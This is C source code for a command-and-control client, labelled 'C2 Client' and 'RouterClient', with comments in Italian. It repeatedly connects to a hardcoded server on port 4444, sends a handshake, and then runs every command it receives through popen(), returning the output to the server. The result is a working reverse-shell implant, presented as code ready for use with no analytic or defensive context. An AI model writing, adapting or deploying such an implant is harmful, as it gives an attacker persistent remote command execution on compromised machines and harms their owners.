#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define SERVER_IP "192.168.1.79"
#define SERVER_PORT 4444
#define MAX_RETRIES 0  // 0 = infiniti

int connect_with_retry() {
    int sock;
    struct sockaddr_in server_addr;
    int retries = 0;
    
    while (MAX_RETRIES == 0 || retries < MAX_RETRIES) {
        // Risoluzione DNS (solo se necessario, per IP diretto possiamo saltare)
        struct hostent *server = gethostbyname(SERVER_IP);
        if (!server) {
            fprintf(stderr, "[!] DNS resolution failed, retrying...\n");
            sleep(5);
            retries++;
            continue;
        }
        
        // Creazione socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("[!] socket failed");
            sleep(5);
            retries++;
            continue;
        }
        
        // Configura indirizzo
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);
        
        // Timeout di connessione breve
        struct timeval timeout = {10, 0}; // 10 secondi
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        
        // Tentativo di connessione
        printf("[*] Connecting to %s:%d (attempt %d)...\n", 
               SERVER_IP, SERVER_PORT, retries + 1);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            fprintf(stderr, "[!] Connection failed: %s\n", strerror(errno));
            close(sock);
            
            // Backoff esponenziale: 5, 10, 20, 40, 60, 60... secondi
            int wait_time = 5 * (1 << (retries < 4 ? retries : 4));
            if (wait_time > 60) wait_time = 60;
            
            printf("[*] Retrying in %d seconds...\n", wait_time);
            sleep(wait_time);
            retries++;
            continue;
        }
        
        printf("[+] Connected successfully!\n");
        return sock; // Successo
    }
    
    return -1; // Fallimento dopo troppi tentativi
}

int main() {
    char buffer[1024];
    
    printf("[C2 Client] Starting with automatic retry...\n");
    
    while (1) {
        // 1. Connetti (con retry infinito)
        int sock = connect_with_retry();
        if (sock < 0) {
            printf("[!] Could not establish connection, exiting.\n");
            return 1;
        }
        
        // 2. Handshake
        char handshake[] = "HELLO|RouterClient|v1.0";
        printf("[*] Sending handshake...\n");
        send(sock, handshake, strlen(handshake), 0);
        
        // 3. Ricevi READY (con timeout)
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) {
            printf("[!] Handshake failed, reconnecting...\n");
            close(sock);
            sleep(5);
            continue;
        }
        
        buffer[bytes] = '\0';
        printf("[+] Server: %s\n", buffer);
        
        // 4. Loop comandi principale
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
            
            if (bytes <= 0) {
                printf("[!] Connection lost, reconnecting...\n");
                close(sock);
                break; // Ritorna al loop di connessione
            }
            
            buffer[bytes] = '\0';
            
            // Gestisci EXIT
            if (strstr(buffer, "EXIT") != NULL) {
                printf("[*] Exit command received\n");
                send(sock, "Goodbye!", 8, 0);
                close(sock);
                return 0;
            }
            
            // Esegui comando
            FILE *fp = popen(buffer, "r");
            if (fp) {
                char output[1024] = {0};
                char line[256];
                
                while (fgets(line, sizeof(line), fp)) {
                    if (strlen(output) + strlen(line) < sizeof(output) - 1) {
                        strcat(output, line);
                    }
                }
                pclose(fp);
                
                // Invia output
                if (strlen(output) == 0) {
                    strcpy(output, "OK\n");
                }
                send(sock, output, strlen(output), 0);
            } else {
                send(sock, "ERROR: Command failed\n", 22, 0);
            }
        }
    }
    
    return 0;
}